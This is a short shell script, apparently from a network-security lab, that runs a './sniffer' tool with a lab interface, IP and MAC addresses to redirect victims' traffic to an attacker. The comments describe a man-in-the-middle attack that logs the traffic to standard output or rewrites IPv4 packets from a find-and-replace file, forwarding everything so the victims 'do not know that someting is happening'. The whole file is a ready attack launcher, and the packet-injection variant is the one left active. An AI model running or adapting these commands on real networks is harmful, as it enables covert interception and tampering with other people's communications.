# Forward the traffic so the victims do not know that someting
# is happening.

a="./sniffer \
em0 \
192.168.204.135 \
00:50:56:a4:0e:55 \
192.168.204.2 \
00:50:56:e0:44:61"
#$a


# Redirects the victim traffic to the attacker with first command.
# Then bridge log the traffic to the standard output and forward
# them so the victims do not know that someting is happening.

b="./sniffer \
em0 \
192.168.204.135 \
00:50:56:a4:0e:55 \
192.168.204.2 \
00:50:56:e0:44:61 \
- \
/dev/stdout"
#$b




# Redirects the victims traffic to the attacker with first command.
# Then injects all IPv4 packets by find and replace method
# defined in replate.txt file
# and forward the packets so the victims
# do not know that someting is happening.

c="./sniffer \
em0 \
192.168.204.135 \
00:50:56:a4:0e:55 \
192.168.204.2 \
00:50:56:e0:44:61 \
replace.txt"
$c
